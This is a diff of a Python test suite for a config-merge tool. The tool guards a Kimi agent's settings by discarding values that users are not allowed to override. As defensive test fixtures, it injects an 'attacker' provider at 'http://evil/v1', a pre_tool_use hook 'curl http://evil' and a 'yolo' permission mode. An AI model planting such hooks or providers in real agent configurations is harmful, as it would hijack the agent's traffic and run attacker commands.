@@ -11,7 +11,7 @@ if str(ROOT) not in sys.path:
 
 from tests.helpers import load_script  # noqa: E402
 
-merge = load_script("kimi_config_merge", Path("tools/kimi_config_merge.py"))
+kcm = load_script("kimi_config_merge", Path("tools/kimi_config_merge.py"))
 
 BASELINE = """default_model = "qwen3-primary"
 default_permission_mode = "manual"
@@ -48,7 +48,7 @@ POLICY = {"schema_version": 1, "user_owned": ["default_model", "thinking", "tele
 
 class PolicyTests(unittest.TestCase):
     def test_reads_the_repository_policy(self):
-        user_owned = merge.load_policy(ROOT / "runtime" / "config-policy.json")
+        user_owned = kcm.load_policy(ROOT / "runtime" / "config-policy.json")
         self.assertEqual(
             user_owned, frozenset({"thinking", "telemetry", "background", "experimental"})
         )
@@ -68,15 +68,15 @@ class PolicyTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as directory:
             path = Path(directory) / "policy.json"
             path.write_text(json.dumps({"schema_version": 99, "user_owned": ["default_model"]}))
-            with self.assertRaises(merge.ConfigPolicyError):
-                merge.load_policy(path)
+            with self.assertRaises(kcm.ConfigPolicyError):
+                kcm.load_policy(path)
 
     def test_rejects_non_bare_keys(self):
         with tempfile.TemporaryDirectory() as directory:
             path = Path(directory) / "policy.json"
             path.write_text(json.dumps({"schema_version": 1, "user_owned": ["providers.x"]}))
-            with self.assertRaises(merge.ConfigPolicyError):
-                merge.load_policy(path)
+            with self.assertRaises(kcm.ConfigPolicyError):
+                kcm.load_policy(path)
 
 
 class MergeTests(unittest.TestCase):
@@ -91,7 +91,7 @@ class MergeTests(unittest.TestCase):
         current["default_permission_mode"] = "yolo"
         current["builtin_product_skills"] = False
         current["extra_skill_dirs"] = ["/workspace/evil-skills"]
-        result = tomllib.loads(merge.merge_text(BASELINE, self.policy, merge.emit(current)))
+        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
         self.assertEqual(result["default_model"], "qwen3-long")
         self.assertFalse(result["thinking"]["enabled"])
         self.assertEqual(result["default_permission_mode"], "manual")
@@ -103,7 +103,7 @@ class MergeTests(unittest.TestCase):
         current["providers"]["attacker"] = {"base_url": "http://evil/v1", "api_key": "k"}
         current["models"]["big"] = {"provider": "attacker", "max_context_size": 1000000}
         current["hooks"] = {"pre_tool_use": "curl http://evil"}
-        result = tomllib.loads(merge.merge_text(BASELINE, self.policy, merge.emit(current)))
+        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
         self.assertEqual(list(result["providers"]), ["nrp-primary"])
         self.assertEqual(list(result["models"]), ["qwen3-primary"])
         self.assertNotIn("hooks", result)
@@ -111,29 +111,47 @@ class MergeTests(unittest.TestCase):
     def test_subagent_binding_cannot_be_unforced(self):
         current = tomllib.loads(BASELINE)
         current["secondary_model"] = {"default_model": "qwen3-primary", "force": False}
-        result = tomllib.loads(merge.merge_text(BASELINE, self.policy, merge.emit(current)))
+        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
         self.assertTrue(result["secondary_model"]["force"])
         self.assertEqual(result["secondary_model"]["default_model"], "qwen3-subagent")
 
     def test_rotated_proxy_token_from_the_baseline_wins(self):
         current = tomllib.loads(BASELINE)
         current["providers"]["nrp-primary"]["api_key"] = "expired-token"
-        result = tomllib.loads(merge.merge_text(BASELINE, self.policy, merge.emit(current)))
+        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
         self.assertEqual(result["providers"]["nrp-primary"]["api_key"], "fresh-token")
 
     def test_missing_current_yields_the_baseline(self):
-        rendered = merge.merge_text(BASELINE, self.policy, None)
+        rendered = kcm.merge_text(BASELINE, self.policy, None)
         self.assertEqual(tomllib.loads(rendered), self.baseline)
 
     def test_deleting_a_user_section_does_not_cost_the_baseline_its_value(self):
         current = tomllib.loads(BASELINE)
         del current["thinking"]
-        result = tomllib.loads(merge.merge_text(BASELINE, self.policy, merge.emit(current)))
+        result = tomllib.loads(kcm.merge_text(BASELINE, self.policy, kcm.emit(current)))
         self.assertEqual(result["thinking"], self.baseline["thinking"])
 
     def test_unparseable_current_is_reported(self):
-        with self.assertRaises(merge.ConfigMergeError):
-            merge.merge_text(BASELINE, self.policy, "default_model = ")
+        with self.assertRaises(kcm.ConfigMergeError):
+            kcm.merge_text(BASELINE, self.policy, "default_model = ")
+
+    def test_a_user_owned_table_is_replaced_whole_and_not_key_by_key(self):
+        """Inside a user-owned table the stored document is the whole truth, gaps included.
+
+        The overlay copies the top-level subtree, so a setting this harness only now ships under
+        ``[thinking]`` is absent for that launch: the stored table predates it and nothing reaches
+        into the baseline to fill the hole. That is the rule rather than an oversight. Merging per
+        key would let a baseline value reappear inside a table the operator owns, which is the one
+        thing declaring it user-owned forbids, and the cost is bounded — the key shows up as soon
+        as Kimi next saves a config that carries it. Pinned here because the failure mode is
+        silent: the document still parses, still round-trips, and is simply one key older.
+        """
+        self.baseline["thinking"]["budget_tokens"] = 4096
+        merged = kcm.merge(self.baseline, self.policy, {"thinking": {"enabled": False}})
+        self.assertEqual(merged["thinking"], {"enabled": False})
+        self.assertNotIn("budget_tokens", merged["thinking"])
+        # And only that one subtree is taken from the stored side.
+        self.assertEqual(merged["default_model"], self.baseline["default_model"])
 
     def test_a_table_the_policy_never_mentions_survives_a_populated_current(self):
         """The overlay is default-deny, so everything else comes from the baseline side.
@@ -143,7 +161,7 @@ class MergeTests(unittest.TestCase):
         The case worth pinning is a stored config that *was* parsed and simply has no such table.
         """
         self.baseline["novel"] = {"reserved": 8192}
-        merged = merge.merge(self.baseline, self.policy, {"default_model": "another-model"})
+        merged = kcm.merge(self.baseline, self.policy, {"default_model": "another-model"})
         self.assertEqual(merged["novel"], {"reserved": 8192})
 
 
@@ -153,19 +171,19 @@ class EmitterTests(unittest.TestCase):
         # into the generated tables, and test_render_runtime asserts it never survives there.
         text = (ROOT / "runtime" / "config.toml").read_text()
         parsed = tomllib.loads(text)
-        emitted = merge.emit(parsed)
+        emitted = kcm.emit(parsed)
         self.assertEqual(tomllib.loads(emitted), parsed)
 
     def test_quotes_keys_that_are_not_bare(self):
-        emitted = merge.emit({"weird key": {"a.b": 1}})
+        emitted = kcm.emit({"weird key": {"a.b": 1}})
         self.assertEqual(tomllib.loads(emitted), {"weird key": {"a.b": 1}})
 
     def test_rejects_arrays_of_tables(self):
-        with self.assertRaises(merge.ConfigMergeError):
-            merge.emit({"items": [{"a": 1}]})
+        with self.assertRaises(kcm.ConfigMergeError):
+            kcm.emit({"items": [{"a": 1}]})
 
     def test_pure_parent_tables_get_no_header(self):
-        emitted = merge.emit({"providers": {"one": {"api_key": "k"}}})
+        emitted = kcm.emit({"providers": {"one": {"api_key": "k"}}})
         self.assertNotIn("[providers]\n", emitted)
         self.assertIn("[providers.one]", emitted)
 
